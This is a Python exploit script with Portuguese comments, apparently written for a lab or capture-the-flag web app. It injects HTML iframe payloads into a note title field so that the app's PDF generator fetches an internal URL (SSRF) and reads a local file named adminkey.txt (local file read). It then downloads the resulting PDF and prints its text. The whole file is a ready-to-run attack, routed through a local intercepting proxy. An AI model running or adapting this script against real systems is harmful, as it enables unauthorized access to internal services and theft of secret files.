import requests
from rich import print #Cores no print
import sys
from bs4 import BeautifulSoup #Parsing de HTML
from PyPDF2 import PdfFileReader #Ler PDF
import time

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}


def send_ssrf_payload():

    url = f"{sys.argv[1]}/actions/store-or-update.php"
    data = {
        "id": '',
        "title": '<iframe src="http://127.0.0.1:8080/users" width="800" height="500"></iframe>',
        "color": '',
        "note": ''
    }
    response = requests.post(url, data=data, headers=headers, proxies=proxies)
    print(f"[bold green]\n SSRF Payload Sended. Waiting retrieve the pdf file...[/bold green]\n")
    time.sleep(1)
    download_and_read_pdf_file()

def download_and_read_pdf_file():

    url = f"{sys.argv[1]}/actions/pdf.php"
    response = requests.get(url, headers=headers, proxies=proxies)
    file_Path = 'file.pdf'

    if response.status_code == 200:
        with open(file_Path, 'wb') as file:
            file.write(response.content)
        with open("file.pdf", "rb") as input_pdf:
            pdf_reader = PdfFileReader(input_pdf) # Criando um objeto PdfFileReader
            num_pages = pdf_reader.numPages # Obtendo o número de páginas do arquivo PDF
            
            for page_number in range(num_pages): # Lendo o texto de cada página
                page = pdf_reader.getPage(page_number)
                text = page.extractText()
                print(f"Texto da página: {page_number + 1}\n {text}")
    else:
        print(f'Failed to download file')

def send_lfi_payload():

    url = f"{sys.argv[1]}/actions/store-or-update.php"
    data = {
        "id": '',
        "title": '<iframe src="file:////users/adminkey.txt" width="800" height="500"></iframe>',
        "color": '',
        "note": ''
    }
    response = requests.post(url, data=data, headers=headers, proxies=proxies)
    time.sleep(1)
    print(f"[bold green]\n LFI Payload Sended. Waiting retrieve the pdf file...[/bold green]\n")
    time.sleep(1)
    download_and_read_pdf_file()

def main():
    send_ssrf_payload()
    send_lfi_payload()

main()